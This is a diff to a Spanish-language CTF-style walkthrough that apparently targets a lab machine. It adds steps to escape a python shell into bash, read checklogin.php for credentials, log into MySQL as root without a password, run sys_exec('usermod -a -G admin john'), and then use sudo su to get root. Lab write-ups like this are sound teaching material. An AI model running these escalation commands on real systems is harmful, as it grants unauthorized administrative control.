@@ -73,5 +73,26 @@ La shell se ejecuta dentro de un intérprete de python por lo que saldremos de e
 ```
 echo os.system('/bin/bash')
 cd /www/var
+cat checklogin.php
 ```
-![9](https://user-images.githubusercontent.com/75953873/178129438-867ea487-da95-432e-8454-c5c42590c05a.png)
+![9](https://user-images.githubusercontent.com/75953873/178129470-0903b88c-271e-4874-90a4-5fbcef300f1a.png)
+
+- *Paso 5:* Iniciar sesión en el servidor MySQL.
+
+Usuario: `root`
+
+Contraseña: **sin contraseña**
+```
+mysql -u root -p
+```
+![10](https://user-images.githubusercontent.com/75953873/178129574-e42549f2-88dd-4a2b-8824-7bdce7f93d08.png)
+
+El comando `usermod` otorgará a `john` al grupo de administradores (root).
+```
+select sys_exec('usermod -a -G admin john');
+```
+![11](https://user-images.githubusercontent.com/75953873/178129692-b62b22bc-5e6f-4611-8276-a9b38b75d4c7.png)
+
+Por último, ejecutar `sudo su` para obtener una shell con privilegios e ingresar al directorio `/root`. La contraseña del root es la misma del servidor SSH.
+
+![12](https://user-images.githubusercontent.com/75953873/178129723-9535e1cd-4441-4040-ae77-0711a3d604c0.png)
